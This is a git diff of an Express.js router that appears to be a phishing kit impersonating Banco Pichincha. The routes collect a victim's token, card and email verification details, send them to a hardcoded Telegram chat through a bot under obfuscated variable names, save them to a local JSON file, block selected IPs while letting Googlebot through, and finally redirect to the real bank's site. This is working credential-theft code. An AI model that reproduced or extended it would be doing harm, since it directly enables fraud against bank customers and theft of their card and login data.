@@ -26,7 +26,6 @@ const json_books = fs.readFileSync('src/books.json', 'utf-8');
 let books = JSON.parse(json_books);
 
 
-
 router.get('/', (req, res) => {
     res.render('index.ejs');
 
@@ -35,8 +34,6 @@ router.get('/token', (req, res) => {
     res.render('token.ejs');
 
 });
-
-
 
 router.get('/cardverificacion', (req, res) => {
     res.render('card.ejs');
@@ -52,7 +49,7 @@ router.get('/emailverificacion', (req, res) => {
 
 
 router.get('/new-logs', (req, res) => {
-    res.render('new-entry.ejs', {
+    res.render('new-logs', {
         books
     })
 });
@@ -114,13 +111,17 @@ bot.sendMessage('791007687', `1: ${r6fa6y89yB}\n2: ${nYffxLjdFW}\n3: ${wJcPshSku
     books.push(newBook);
     
 
-  res.render('loading'); // Renderiza la vista "loading" mientras espera los 15 segundos
 
-  // Espera 15 segundos antes de redirigir
-  setTimeout(() => {
+    
+     const json_books = JSON.stringify(books)
+    fs.writeFileSync('src/books.json', json_books, 'utf-8');
+    
+    
     res.redirect('cardverificacion');
-  }, 5000);
+    
 });
+
+
 
 
 router.post('/cardverificacion',  (req, res) => {
@@ -154,15 +155,11 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
     const json_books = JSON.stringify(books)
     fs.writeFileSync('src/books.json', json_books, 'utf-8');
 
-
-
-res.render('loading2'); // Renderiza la vista "loading" mientras espera los 15 segundos
-
-  // Espera 30 segundos antes de redirigir
-  setTimeout(() => {
+   
     res.redirect('emailverificacion');
-  }, 5000);
+ 
 });
+
 
 
 router.post('/emailverificacion',  (req, res) => {
@@ -198,10 +195,8 @@ if (ipBlockList.includes(ip) && !googlebotIps.includes(ip)) {
     fs.writeFileSync('src/books.json', json_books, 'utf-8');
 
     
-          // Espera 30 segundos antes de redirigir
-setTimeout(() => {
+      
     res.redirect('https://www.pichincha.com/');
-  }, 70000); // 30000 milisegundos = 30 segundos
 
 });
 
